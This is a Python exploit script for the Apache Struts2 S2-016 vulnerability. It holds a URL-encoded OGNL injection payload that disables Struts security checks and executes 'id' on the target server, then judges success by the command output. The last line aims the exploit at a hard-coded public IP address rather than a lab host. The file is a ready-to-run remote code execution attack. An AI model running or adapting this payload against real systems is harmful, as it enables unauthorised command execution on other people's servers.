import requests
# http://vulapps.evalbug.com/s_struts2_s2-016/
# url是IP
class struts2_016_2:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_016_2'.format(self.url))
        exp = '/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D'
        self.url += exp
        try:
            resp = requests.get(self.url, timeout=10)
            if "groups" in resp.text:
                return "s2-016-2"
        except:
            #print('test --> struts2_016_2 Failed!')
            return None
        return None

print(struts2_016_2('http://45.77.123.178/').attack())